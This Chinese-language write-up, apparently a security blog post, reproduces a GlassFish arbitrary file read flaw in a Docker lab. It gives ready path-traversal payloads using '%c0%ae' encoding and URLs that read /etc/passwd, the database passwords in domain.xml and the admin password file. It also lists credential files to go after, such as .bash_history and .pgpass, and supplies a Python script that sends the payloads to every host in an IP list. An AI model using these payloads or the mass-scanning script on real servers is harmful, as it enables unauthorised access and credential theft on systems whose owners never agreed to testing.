## **简介：**

 ***** GlassFish*
是一款强健的商业兼容应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改。

![1628413409_610f9de1bbde45a450095.png!small?1628413410069](https://image.3001.net/images/20210808/1628413409_610f9de1bbde45a450095.png!small?1628413410069)

##  **漏洞类型：**

 **任意文件读取** ：可以利用此漏洞读取到受害机的任意文件

 **glassdish漏洞成因** : java语义中会把"%c0%ae"解析为"\uC0AE"，最后转义为ASCCII字符的"."（点）

##  **漏洞复现：**

环境搭建：我们这里使用docker中的vulhub漏洞环境

启动镜像：docker-compose up -d

![1628413421_610f9ded926b81401da5c.png!small?1628413421895](https://image.3001.net/images/20210808/1628413421_610f9ded926b81401da5c.png!small?1628413421895)

    
    
    linux_poc:  
    /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd  
    window_poc:  
    /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini

访问地址：[https://192.168.10.129:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd](https://192.168.10.129:4848/theme/META-INF/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd)

linux下比较敏感的文件：

    
    
    /etc/issue 版本信息  
    /var/spool/cron/crontabs/root　定时任务  
    /etc/passwd   
    /root/.bash_history　bash环境下的命令执行历史记录  
    /root/.pgpass　记录连接postgressql服务器的密码  
    /root/.psql_history　potgressql客户端的执行的sql语句历史记录

重点关注/etc/passwd文件，后面带有的:/bin/bash 这个文件告诉我们有那些用户，会分别对应/home/下的文件夹(默认情况下)
还有/root/.bash_history,这里面敏感信息比较多。

glassfish:的敏感目录

    
    
    domains/domain1/config/domain.xml 各种数据库密码位置  
    domains/domain1/config/admin-keyfile 后台密码存储位置

 **获取数据库密码**

[https://192.168.10.129:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/domain.xml](https://192.168.10.129:4848/theme/META-INF/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/domains/domain1/config/domain.xml)

![1628413440_610f9e00c41fdaf024276.png!small?1628413441138](https://image.3001.net/images/20210808/1628413440_610f9e00c41fdaf024276.png!small?1628413441138)

 **获取glassfish的后台密码：**

[https://192.168.10.129:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile](https://192.168.10.129:4848/theme/META-INF/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/domains/domain1/config/admin-keyfile)

![1628413449_610f9e09dd3ef9b188424.png!small?1628413450143](https://image.3001.net/images/20210808/1628413449_610f9e09dd3ef9b188424.png!small?1628413450143)

注：得出得密码是以sha256的密文加密的方式，需要在相关平台解密

poc脚本

    
    
    import requests,time  
    requests.packages.urllib3.disable_warnings()  
    ​  
    win_poc='/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'  
    linux_poc='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'  
    ​  
    for ip in open('ip.txt'):  
    ip=ip.replace('\n','')  
    vul_windows=ip+win_poc  
    vul_linux=ip+linux_poc  
    try:  
    print('check->' + ip)  
    win_code = requests.get(vul_windows,verify=False).status_code  
    linux_code = requests.get(vul_linux,verify=False).status_code  
    ​  
    if win_code == 200 or linux_code == 200:  
    print(ip + '|有漏洞')  
    except Exception as err:  
    print('connecting error')

![1628413475_610f9e23a8560732196d2.png!small?1628413475993](https://image.3001.net/images/20210808/1628413475_610f9e23a8560732196d2.png!small?1628413475993)

脚本下载地址:<https://github.com/everybelief/glassfish_poc/>

